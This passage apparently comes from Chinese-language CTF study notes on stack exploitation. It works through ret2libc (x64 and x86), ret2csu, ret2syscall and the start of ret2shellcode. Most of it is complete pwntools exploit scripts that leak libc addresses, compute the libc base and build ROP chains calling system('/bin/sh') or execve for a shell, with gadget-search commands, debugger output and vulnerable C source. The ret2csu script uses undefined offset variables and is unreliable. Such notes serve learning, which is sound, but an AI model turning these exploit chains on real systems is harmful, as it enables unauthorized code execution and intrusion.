然后再去布置栈帧，控制执行流system(“&#x2F;bin&#x2F;sh”)，这就是ret2libc</strong></p><ul><li>整体思路</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。</span><br><span class="line">2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略）。</span><br><span class="line">3.根据libc库的版本可以很容易的确定puts函数的偏移地址。</span><br><span class="line">4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。</span><br><span class="line">5.根据libc函数的版本，很容易确定system函数和&quot;/bin/sh&quot;字符串在libc库中的偏移地址。 </span><br><span class="line">6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和&quot;/bin/sh&quot;字符串的真实地址。</span><br><span class="line">7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(&quot;/bin/sh&quot;)的真实地址，从而拿到shell。</span><br></pre></td></tr></table></figure><ul><li><p><strong>基地址 &#x3D; 真实地址  -  偏移地址</strong></p></li><li><p><strong>0x01 获取基地址, 并求出需要用的函数的地址</strong></p></li><li><p>rdi , rsi , r15(没用的) 赋值并ret</p></li><li><p><code>p64(1)</code> 为标准输出, <code>rsi</code> 传入 <code>write@got</code>(要泄漏的地址) , <code>r15</code> 用垃圾值 <code>0xdeadbeef</code> 填充</p></li><li><p>再调用 <code>p64(write_symbols)</code> 输出, 即可获得实际地址：</p></li><li><p><code>基地址 = 真实地址 - 偏移地址</code> &#x3D; <code>libc_base = write_addr - libc.sym[&quot;write&quot;]</code></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_5_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile) </span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)   <span class="comment"># ldd FILENAME 来查看 （下面获取system..的偏移地址需要用到）</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">leak_write_got = <span class="number">0x404018</span></span><br><span class="line"><span class="comment"># leak_write_got = elf.got[&quot;write&quot;]  也是可以的, 目的是获取write@got</span></span><br><span class="line">write_symbols = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4011fb</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4011f9</span>  <span class="comment">#因为是write(x,x,x) 有三个参数 所以要传入 rdi rsi rdx</span></span><br><span class="line"><span class="comment"># 没有rdx的ROP那就用已经存在的</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_ret) + p64(leak_write_got) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(write_symbols)</span><br><span class="line"><span class="comment"># rdi为第一个参数 传入1 标准输出 (0代表标准输入 2错误重定向)</span></span><br><span class="line"><span class="comment"># rsi为第二个参数 传入write@got</span></span><br><span class="line"><span class="comment"># r15没有实际用处，传入junk数据就好</span></span><br><span class="line"><span class="comment"># 最后调用write (write_symbols), 输出write在libc中的真实地址！</span></span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;byebye&quot;</span>)</span><br><span class="line">write_addr = u64(io.recv().ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))  <span class="comment"># 处理数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr:&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基地址</span></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]   <span class="comment"># 基地址 = 真实地址 - 偏移地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><ul><li>得出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write_addr: 0x70300a71c560</span><br><span class="line">libc_base: 0x70300a600000</span><br><span class="line">system: 0x70300a658750</span><br><span class="line">bin_sh: 0x70300a7cb42f</span><br></pre></td></tr></table></figure><ul><li><strong>0x02 构造最终payload</strong><br>只需要在原来的基础上增加x64位传参的语句就可以了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_5_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile) </span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)   <span class="comment"># ldd FILENAME 来查看 （下面获取system..的偏移地址需要用到）</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">leak_write_got = <span class="number">0x404018</span></span><br><span class="line"><span class="comment"># leak_write_got = elf.got[&quot;write&quot;]  也是可以的, 目的是获取write@got</span></span><br><span class="line">write_symbols = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4011fb</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4011f9</span>  <span class="comment">#因为是write(x,x,x) 有三个参数 所以要传入 rdi rsi rdx</span></span><br><span class="line"><span class="comment"># 没有rdx的ROP那就用已经存在的</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_ret) + p64(leak_write_got) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(write_symbols)</span><br><span class="line"><span class="comment"># rdi为第一个参数 传入1 标准输出 (0代表标准输入 2错误重定向)</span></span><br><span class="line"><span class="comment"># rsi为第二个参数 传入write@got</span></span><br><span class="line"><span class="comment"># r15没有实际用处，传入junk数据就好</span></span><br><span class="line"><span class="comment"># 最后调用write (write_symbols), 输出write在libc中的真实地址！</span></span><br><span class="line">payload += p64(return_addr)</span><br><span class="line"><span class="comment"># 重新回到dofunc 函数，为下面最终payload腾空间  </span></span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;byebye&quot;</span>)</span><br><span class="line">write_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))  <span class="comment"># 处理数据</span></span><br><span class="line"><span class="comment"># io.recv(6) 代表只接受六位数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr:&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基地址</span></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh/system_addr</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh:&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * padding + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)  </span><br><span class="line"><span class="comment"># 熟悉的x64传参方式，先传入binsh到rdi, 然后调用system  </span></span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>栈情况 :</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">02:0010│ rsi 0x7ffd0c5d84b0 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">03:0018│ rbp 0x7ffd0c5d84b8 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">04:0020│+008 0x7ffd0c5d84c0 —▸ 0x4011fb (__libc_csu_init+91) ◂— pop rdi</span><br><span class="line">05:0028│+010 0x7ffd0c5d84c8 —▸ 0x72d6259cb42f ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line">06:0030│+018 0x7ffd0c5d84d0 —▸ 0x72d625858750 (system) ◂— endbr64</span><br></pre></td></tr></table></figure><h6 id="ret2libc-x86"><a href="#ret2libc-x86" class="headerlink" title="ret2libc x86"></a>ret2libc x86</h6><p>与 ret2libc x64大差不差，步骤还是那几个</p><ul><li>IDA 或者 gdb 计算溢出大小</li><li>溢出后调用程序内的 write, 传参 <code>1</code> 标准输出, <code>write@got</code>, 4字节长度(i386)</li><li>通过真实地址和偏移地址计算出基地址</li><li>通过基地址和 libc 中的偏移地址计算出实际地址</li><li>ret 回 <code>main</code> 函数，重新构造 payload：调用 <code>system</code> 函数，传参 <code>/bin/sh</code><br><strong>需要注意的是传参方式 :</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x64:</span><br><span class="line">rdx overflow</span><br><span class="line">func  (通过寄存器传参: rsi rdi rdx rcx r8 r9 ...)</span><br><span class="line">xxxxxxxxxxxx</span><br><span class="line">_______________________________________________________________________________</span><br><span class="line">x86:</span><br><span class="line">rdx overflow</span><br><span class="line">func</span><br><span class="line">main_ret (or other junk strings)</span><br><span class="line">argc1</span><br><span class="line">argc2</span><br><span class="line">argc3</span><br></pre></td></tr></table></figure><p>构造 payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)   <span class="comment"># checksec FILENAME</span></span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_5_x86&#x27;</span> </span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile) </span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)  <span class="comment"># 引入libc共享库文件</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span></span><br><span class="line">leak_write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]   <span class="comment"># write@got</span></span><br><span class="line">write_symbols = elf.symbols[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># main函数中的真实write地址</span></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>] <span class="comment"># dofunc_addr</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * padding, write_symbols, return_addr, <span class="number">1</span>, leak_write_got, <span class="number">4</span>, return_addr])</span><br><span class="line"><span class="comment"># 溢出 -&gt; 调用dofunc中的write(), dofunc_ret, argc1:1, argc2:write@got, argc3:4, 返回到dofunc</span></span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;byebye&quot;</span>)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))  <span class="comment"># 只需要最多读取四个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr:&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基地址</span></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh/system_addr</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh:&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">b&#x27;a&#x27;</span> * padding, system_addr, return_addr, binsh_addr])</span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload2)</span><br><span class="line">io.recvuntil(<span class="string">&quot;byebye&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h6 id="ret2csu-x64"><a href="#ret2csu-x64" class="headerlink" title="ret2csu x64"></a>ret2csu x64</h6><p>通过修改控制 gadget 的段落来达到控制参数的目的  (输出地址)</p><ul><li>__libc_csu_init</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011D8 loc_4011D8:                             ; CODE XREF: __libc_csu_init+4C↓j</span><br><span class="line">.text:00000000004011D8                 mov     rdx, r14</span><br><span class="line">.text:00000000004011DB                 mov     rsi, r13</span><br><span class="line">.text:00000000004011DE                 mov     edi, r12d</span><br><span class="line">.text:00000000004011E1                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:00000000004011E5                 add     rbx, 1</span><br><span class="line">.text:00000000004011E9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011EC                 jnz     short loc_4011D8</span><br><span class="line">.text:00000000004011EE</span><br><span class="line">.text:00000000004011EE loc_4011EE:                             ; CODE XREF: __libc_csu_init+31↑j</span><br><span class="line">.text:00000000004011EE                 add     rsp, 8</span><br><span class="line">.text:00000000004011F2                 pop     rbx     &lt;-- !(从这里开始 因为上面的add 指令我们并不需要)!</span><br><span class="line">.text:00000000004011F3                 pop     rbp</span><br><span class="line">.text:00000000004011F4                 pop     r12</span><br><span class="line">.text:00000000004011F6                 pop     r13</span><br><span class="line">.text:00000000004011F8                 pop     r14</span><br><span class="line">.text:00000000004011FA                 pop     r15</span><br><span class="line">.text:00000000004011FC                 retn</span><br></pre></td></tr></table></figure><p><strong>执行思路</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 溢出</span><br><span class="line">2 从0x4011F2 开始，retn = 0x4011D8(上面的一段)</span><br><span class="line">3 r12=argc1; r13=argc2; r14=argc3</span><br><span class="line">4 jnz xxx , 只需要让rbx = 0; rbp = 1 即可</span><br><span class="line">5 call xxxx [r15+rbx*8]: 只需要使 rbx = 0 ; r15 = 要跳转的地址就可以了</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_5_plus_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">leak_func_name =<span class="string">&#x27;write&#x27;</span>  </span><br><span class="line">leak_func_got = elf.got[leak_func_name]</span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>]</span><br><span class="line">write_sym = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rbx_addr = <span class="number">0x4011F2</span>  <span class="comment"># __libc_csu_init 的下面一段 </span></span><br><span class="line">rbx=<span class="number">0</span></span><br><span class="line">rbp=<span class="number">1</span></span><br><span class="line">r12=<span class="number">1</span></span><br><span class="line">r13=leak_func_got <span class="comment"># write(1,leak_func_got,6)</span></span><br><span class="line">r14=<span class="number">6</span></span><br><span class="line">r15 = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_rdx_r14_addr = <span class="number">0x4011D8</span>  <span class="comment"># __libc_csu_init 的上面一段</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span>* padding </span><br><span class="line">payload += flat([pop_rbx_addr , rbx , rbp , r12 , r13 , r14 , r15 , mov_rdx_r14_addr])</span><br><span class="line">payload +=  p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span> + p64(return_addr)</span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;bye&#x27;</span>)</span><br><span class="line">write_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr:&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_addr = write_addr - wirte_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr:&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + system_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_addr + bin_sh_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh_addr:&#x27;</span>,<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2 = b&#x27;a&#x27;* padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span></span><br><span class="line"><span class="comment"># delimiter = &#x27;input:&#x27;</span></span><br><span class="line"><span class="comment"># io.sendlineafter(delimiter, payload2)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h6 id="ret2syscall-0x32-0x64"><a href="#ret2syscall-0x32-0x64" class="headerlink" title="ret2syscall 0x32 &#x2F; 0x64"></a>ret2syscall 0x32 &#x2F; 0x64</h6><p>基本rop之一，意为call system，控制程序执行系统调用，获取shell<br>利用的是 <code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code><br>向寄存器存放的参数分别为:</p><ul><li>系统调用号，即 eax 应该为 <code>0xb</code>  ; <strong>此为 execve 对应的系统调用号</strong></li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li><li>int 0x80（触发中断)<br><strong>0x32 位例题</strong><br>0x01: 先 ROPgadget</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">ROPgadget --binary rop --string &#x27;/bin/sh&#x27;</span><br><span class="line">ROPgadget --binary rop --only &#x27;int&#x27;  (int 0x80)</span><br></pre></td></tr></table></figure><p>0x02 编写脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="number">0x10</span> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p32(pop_eax_ret) + p32(<span class="number">0x0b</span>)  <span class="comment"># 为 execve 对应的系统调用号, 固定为0x0b</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0x0</span>) + p32(<span class="number">0x0</span>) + p32(bin_sh) + p32(int_0x80)</span><br></pre></td></tr></table></figure><p><strong>0x64 位例题</strong><br>和32位大差不差，就是传参方面要用寄存器传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + rdi_addr + bin_sh + eax_rdx_ebx_addr + p64(<span class="number">0x3b</span>）</span><br><span class="line">payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0X0</span>) + rsi_addr + p64(<span class="number">0x0</span>) + syscall_addr <span class="comment">#这里的eax其实就是rax</span></span><br></pre></td></tr></table></figure><h6 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h6><p>源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="type">int</span> pagesize = getpagesize();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr = buf2;</span><br><span class="line">        addr = (addr &gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>;</span><br><span class="line">        mprotect(addr, pagesize, <span class="number">7</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf2, buf, <span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 